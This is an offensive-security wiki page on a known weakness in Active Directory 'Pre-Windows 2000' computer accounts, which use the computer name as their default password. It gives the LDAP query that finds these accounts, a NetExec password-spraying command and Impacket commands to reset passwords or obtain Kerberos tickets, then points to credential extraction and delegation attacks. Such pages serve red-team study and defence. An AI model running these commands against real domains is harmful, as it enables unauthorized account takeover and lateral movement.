# 🖥️ Pre-Windows 2000 Computers
---

#### 🤓 RTFM

Domain computer accounts that are configured as *Pre-Windows 2000 computers* have a default password which corresponds to the computer name without the trailing `$`.

```powershell
# If the computer domain account is...
company.local/COMPUTER-NAME$

# ...the password will be.
computer-name
```

Therefore, if you know domain computer names, you can blindly attempt this password pattern for each of them until you find one which works.

> [!NOTE]
> It's not because the computer account exists in the domain that the actual related machine exists. In most cases, vulnerable domain computer accounts referred to old decommissioned machines. Still, you can use vulnerable accounts to gain an initial foothold into the domain or to perform [Resource-Based Constrained Delegation](/docs/active-directory/privilege-escalation/resource-based-constrained-delegation.html).

#### 📝 Prerequisites

- Network route to a domain controller.

#### 🛠️ Do it!

If you already have a domain account, you can lookup on domain computers that are configured as *Pre-Windows 2000 computers* through LDAP. It consists in finding domain accounts with their [UserAccountControl](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties) set as `PASSWD_NOTREQD` (32) and `WORKSTATION_TRUST_ACCOUNT` (4096). 

# [LDAPSearch-AD](#tab/ldapsearch)

The Python3 script [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) can be used from both Linux and Windows. 

```bash
./ldapsearch-ad.py -l $DomainControllerIP -d $Domain -u $Username -p $Password -t search -s '(userAccountControl=4128)'
```
# [ADSearch](#tab/adsearch)

[ADSearch](https://github.com/tomcarver16/ADSearch) is .NET tool.

```powershell
./ADSearch.exe --search "(userAccountControl=4128)"
```

---

Otherwise, you can attempt on all domain computer accounts after having [retrieved the list of domain computers](/docs/active-directory/recon/domain-computers.html). **Don't forget to add the trailing `$` at the end of computer names.**

```bash
nxc smb $DomainControllerIP -d $Domain -u computers.txt -p passwords.txt --no-bruteforce --continue-on-success
```

If you are using [NetExec](https://github.com/Pennyw0rth/NetExec), authentication attempts with error `WORKSTATION_TRUST_ACCOUNT` mean it is a Pre-Windows 2000 computer. Once you identify a vulnerable domain machine account, you can change its password. You can do it using [impacket-rpcchangepwd](https://github.com/fortra/impacket/pull/1304/commits/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6).

```bash
impacket-rpcchangepwd "$Domain"/"$ComputerName\$":"$ComputerNameInLowerCase"@"$DomainControllerIP" -newpass "$NewPassword"
```

Alternatively, you can authenticate using Kerberos without changing the password with [impacket-getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py).

```bash
impacket-getTGT "$Domain"/"$ComputerName\$":"$ComputerNameInLowerCase"@"$DomainControllerIP"
```

> [!NOTE]
> If the corresponding machine exists and is reachable, note that the associated domain computer account is local administrator.

#### 🏆 What's next?

- If it is your first authenticated access to the domain, let's [enumerate](/docs/active-directory/methodology.html#-enumeration) it.
- If the corresponding machine exists, since you have a local administrator access, you can attempt to [extract credentials](/docs/windows/privilege-escalation/credentials-extraction.html).
- Finally, now you compromised a domain computer account, you can attempt to perform [Resource-Based Constrained Delegation](/docs/active-directory/privilege-escalation/resource-based-constrained-delegation.html).

#### 🔗 Useful links

- An [interesting blog](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts) explaining this technique.